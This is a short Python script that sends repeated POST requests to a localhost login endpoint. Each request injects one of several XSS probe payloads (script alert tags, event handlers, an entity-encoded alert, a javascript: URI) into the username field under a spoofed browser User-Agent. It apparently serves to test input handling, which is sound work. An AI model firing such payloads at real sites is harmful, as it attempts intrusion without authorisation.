import requests

url = 'http://localhost:5001/login'
n_requests = 100

login_data_template = {
    "username": "robert@gmail.com",
    "password": "Password1&",
    "code": "424496"
}

xss_scripts = [
    "<script>alert('XSS1')</script>",
    "onmouseenter=alert(3)",
    "setTimeout('alert(5)', 0)",
    "<script>alert('&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;')</script>",
    "onload=alert(3)",
    "javascript:void(window.alert('XSS5'))"
]

for i in range(n_requests):

    malicious_username = f"robert{xss_scripts[i % len(xss_scripts)]}@gmail.com"
    login_data = login_data_template.copy()
    login_data['username'] = malicious_username
    
    headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }
    response = requests.post(url, json=login_data, headers=headers)
    
    print(f"Request {i + 1}: Status Code = {response.status_code}, Response = {response.text}")

